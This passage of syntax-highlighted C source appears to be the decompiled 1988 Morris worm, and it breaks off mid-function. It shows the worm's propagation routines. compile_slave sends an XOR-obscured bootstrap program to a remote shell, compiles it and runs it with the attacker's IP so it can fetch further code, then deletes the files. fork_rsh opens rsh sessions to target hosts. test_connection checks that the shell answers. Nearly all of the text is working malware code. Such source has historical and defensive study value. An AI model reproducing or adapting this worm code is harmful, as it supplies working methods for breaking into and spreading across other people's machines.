</span><span class="sc1">/* Only called from within mail */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">compile_slave</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* x431e, &lt;waithit+1176&gt; */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">     
    </span><span class="sc11">object</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">obj</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">              </span><span class="sc1">/* 516 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cfile</span><span class="sc10">[</span><span class="sc4">56</span><span class="sc10">];</span><span class="sc0">             </span><span class="sc1">/* 568 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wr_len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc1">/* might be same */</span><span class="sc0">
    
    </span><span class="sc11">obj</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getobjectbyname</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"l1.c"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1590 */</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"cd /usr/tmp\n"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">cfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"x%d.c"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"cat &gt; %s &lt;&lt;\'EOF\'\n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">cfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wr_len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wr_len</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">obj</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"EOF\n"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">a2in</span><span class="sc10">(</span><span class="sc11">arg16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg24</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">)-&gt;</span><span class="sc11">baz</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0">           </span><span class="sc1">/* 0x44c0, &lt;waithit+1594&gt; */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Used in try_rsh_and_mail(). */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">fork_rsh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdp1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdp2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0">      </span><span class="sc1">/* 0x44f4, &lt;waithit+1646&gt; */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fdp1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fdp2</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">child</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* 4 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">              </span><span class="sc1">/* 12 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">             </span><span class="sc1">/* 20 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pipe</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pipe</span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">child</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fork</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">child</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                </span><span class="sc1">/* 1798 */</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">child</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">               </span><span class="sc1">/* 2118 */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">dup2</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">dup2</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc1">/* 'execl()' does not return if it suceeds. */</span><span class="sc0">
    </span><span class="sc11">execl</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/usr/ucb/rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">execl</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/usr/bin/rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">execl</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/bin/rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"rsh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">fdp1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fildes1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">fdp2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fildes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(*</span><span class="sc11">fdp1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fdp2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* Sucess!!! */</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(*</span><span class="sc11">fdp1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(*</span><span class="sc11">fdp2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">kill</span><span class="sc10">(</span><span class="sc11">child</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Give the child a chance to die from the signal. */</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wait3</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WNOHANG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">rdfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wrfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">)</span><span class="sc0">            </span><span class="sc1">/* x476c,&lt;waith
it+2278&gt; */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rdfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wrfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">combuf</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">numbuf</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">numbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%d"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">combuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"\n/bin/echo %s\n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">numbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">wrfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">combuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">wait_for</span><span class="sc10">(</span><span class="sc11">rdfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">wait_for</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">)</span><span class="sc0">          </span><span class="sc1">/* &lt;waithit+2412&gt; */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">length</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x488e</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 2532 */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strncmp</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Installed as a signal handler */</span><span class="sc0">
</span><span class="sc11">justreturn</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">scp</span><span class="sc10">)</span><span class="sc0">                  </span><span class="sc1">/* 0x4872 */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sigcontext</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">scp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">alarmed</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">x488e</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">num_chars</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">maxtime</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">num_chars</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">maxtime</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   
    
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readfds</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">num_chars</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">       </span><span class="sc1">/* 46,192 */</span><span class="sc0">
    </span><span class="sc11">readfds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">maxtime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">readfds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">timeout</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readfds</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">)</span><span class="sc0">
